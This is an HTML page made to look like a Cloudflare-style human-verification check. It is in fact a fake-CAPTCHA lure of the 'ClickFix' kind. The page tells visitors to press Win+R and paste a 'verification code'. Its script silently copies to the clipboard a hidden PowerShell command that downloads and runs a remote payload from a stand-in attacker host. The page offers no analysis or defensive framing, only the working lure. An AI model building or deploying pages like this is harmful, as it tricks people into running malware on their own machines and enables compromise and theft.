<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Verify you are human</title>
<style>
  body { font-family: Arial, sans-serif; background: #f5f5f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
  .box { background: white; border-radius: 8px; padding: 40px; max-width: 480px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); text-align: center; }
  .cf-logo { font-size: 32px; margin-bottom: 12px; }
  h2 { margin-bottom: 8px; color: #1a1a1a; }
  p { color: #555; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
  .steps { text-align: left; background: #f8f8f8; border-radius: 6px; padding: 16px 20px; margin-bottom: 20px; font-size: 13px; }
  .steps li { margin-bottom: 8px; color: #333; }
  .verify-btn { background: #f48120; color: white; border: none; padding: 12px 32px; border-radius: 5px; font-size: 15px; font-weight: 600; cursor: pointer; }
  .verify-btn:hover { background: #e07010; }
  kbd { background: #e8e8e8; padding: 2px 6px; border-radius: 3px; font-family: monospace; }
</style>
</head>
<body>
<div class="box">
  <div class="cf-logo">🛡️</div>
  <h2>Verify you are human</h2>
  <p>One more step — please complete this verification to access the page.</p>
  <ol class="steps">
    <li>Click <strong>Verify</strong> below to copy the verification code</li>
    <li>Press <kbd>Win</kbd> + <kbd>R</kbd> to open the Run dialog</li>
    <li>Paste the code (<kbd>Ctrl</kbd> + <kbd>V</kbd>) and press Enter</li>
  </ol>
  <button class="verify-btn" onclick="copyCmd()">Verify ✓</button>
  <p id="status" style="margin-top:12px;font-size:12px;color:#888;"></p>
</div>
<script>
function copyCmd() {
  const cmd = 'powershell -w hidden -c "iex(iwr https://evil.example.com/payload.ps1)"';
  navigator.clipboard.writeText(cmd).then(() => {
    document.getElementById('status').textContent = 'Code copied! Follow steps above.';
  }).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = cmd;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    document.getElementById('status').textContent = 'Code copied! Follow steps above.';
  });
}
</script>
</body>
</html>
